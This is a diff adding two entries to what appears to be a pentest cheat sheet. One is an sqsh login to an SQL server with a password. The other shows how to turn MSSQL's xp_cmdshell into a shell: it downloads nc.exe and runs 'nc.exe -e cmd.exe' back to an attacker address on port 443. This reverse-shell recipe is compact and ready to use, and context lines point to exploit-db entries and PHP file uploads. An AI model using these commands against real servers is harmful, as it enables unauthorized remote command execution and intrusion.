@@ -972,6 +972,11 @@ mysql-sha1
 chmod 777 OR chmod 600
 chmod +x file_name  - give current user permisson
 ```
+### Connect to SQL server with login
+```
+sqsh -S 192.168.2.x -U 192.168.2.x\\user_name -P this1smyPassword
+
+```
 
 ## Exploits- Specific Scenarios
 
@@ -983,6 +988,18 @@ Visit and follow
 https://www.exploit-db.com/exploits/44976
 - NOTE! When uploading file to CMS copy to .php file type in the upload folder
 ```
+
+### from xp_cmdshell to shell
+```
+DOWNLOAD nc.exe from and upload to directory to use
+https://packetstormsecurity.com/files/download/31140/nc.exe
+
+xp_cmdshell 'PAYLOAD';
+\go
+
+PAYLOAD = 'C:\inetpub\wwwroot\nc.exe -e cmd.exe 10.8.0.x 443'
+```
+
 
 ### IIS FTP file upload exploit
 ```
